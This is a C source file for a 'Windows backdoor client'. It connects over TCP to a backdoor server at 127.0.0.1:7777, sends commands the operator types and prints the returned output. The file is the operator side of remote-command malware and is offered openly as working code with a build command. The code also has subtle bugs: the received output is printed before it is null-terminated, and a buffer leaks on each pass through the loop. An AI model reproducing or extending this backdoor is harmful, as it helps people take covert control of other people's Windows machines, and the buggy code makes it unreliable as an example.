// Windows backdoor client
// g++ ./backdoor_client.c -o ./backdoor_client.exe -lwsock32
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <windows.h>
#include <stdbool.h>

SOCKET clientSocketConnection;

// Signal handler for the backdoor client (such like Ctrl + C)
void interruptionHandler(int signal) {
    
    printf("** Interruption detected, Closing the backdoor client **\n");
    closesocket(clientSocketConnection);

    WSACleanup();

    exit(0);
}

int main(void) {

    // Backdoor server IP and port
    const char *BACKDOOR_SERVER_IP_STRING = "127.0.0.1";
    const long unsigned int BACKDOOR_SERVER_IP = inet_addr(BACKDOOR_SERVER_IP_STRING);
    const short unsigned int BACKDOOR_SERVER_PORT = 7777;
    const unsigned int DEFAULT_BUFFER_SIZE = 4096;

    WSADATA windowsSocketData;
    struct sockaddr_in serverAddress;
    char* buffer = (char *)malloc(DEFAULT_BUFFER_SIZE * sizeof(char));

    // Setting up signal handler for the backdoor client
    signal(SIGINT, interruptionHandler);

    // Initialize the Windows Sockets API
    if (WSAStartup(MAKEWORD(2, 2), &windowsSocketData) != 0) {
        printf("Error initializing the Windows Sockets API\n");
        return -1;
    }

    // Create a socket connection to the backdoor server
    clientSocketConnection = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocketConnection == INVALID_SOCKET) {
        printf("Error creating the socket connection\n");
        WSACleanup();
        return -1;
    }

    memset(&serverAddress, 0, sizeof(serverAddress));
    serverAddress.sin_family = AF_INET;                 // IPv4 address family
    serverAddress.sin_addr.s_addr = BACKDOOR_SERVER_IP; // Corrected line
    serverAddress.sin_port = htons(BACKDOOR_SERVER_PORT);// Listening on port 7777

    // Connect to the backdoor server
    if (connect(clientSocketConnection, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        printf("Error connecting to the backdoor server\n");
        closesocket(clientSocketConnection);
        WSACleanup();
        return -1;
    }

    printf("Connected to the backdoor server!(%s:%d)\n", BACKDOOR_SERVER_IP_STRING, BACKDOOR_SERVER_PORT);

    while (true) {
        printf("%s:%d~$ ", BACKDOOR_SERVER_IP_STRING, BACKDOOR_SERVER_PORT);
        fgets(buffer, DEFAULT_BUFFER_SIZE, stdin);
        
        // Null-terminate the buffer
        buffer[strcspn(buffer, "\n")] = 0;

        // Send the command to the backdoor server
        send(clientSocketConnection, buffer, strlen(buffer), 0);

        unsigned int bytesRead = 0;
        char *commandOutputBuffer = (char *)malloc(DEFAULT_BUFFER_SIZE * sizeof(char));
        if ((bytesRead = recv(clientSocketConnection, commandOutputBuffer, DEFAULT_BUFFER_SIZE, 0)) == SOCKET_ERROR) {
            printf("Error receiving data from the backdoor server, byte counting mismatch\n");
            closesocket(clientSocketConnection);
            WSACleanup();
            return -1;
        } else {
            // Print the received data
            printf("%s\n", commandOutputBuffer);
        }

        // Null-terminate the received data
        commandOutputBuffer[bytesRead] = '\0';

    }

    // Close the socket connection
    closesocket(clientSocketConnection);

    // Cleanup the Windows Sockets API
    WSACleanup();

    return 0;
}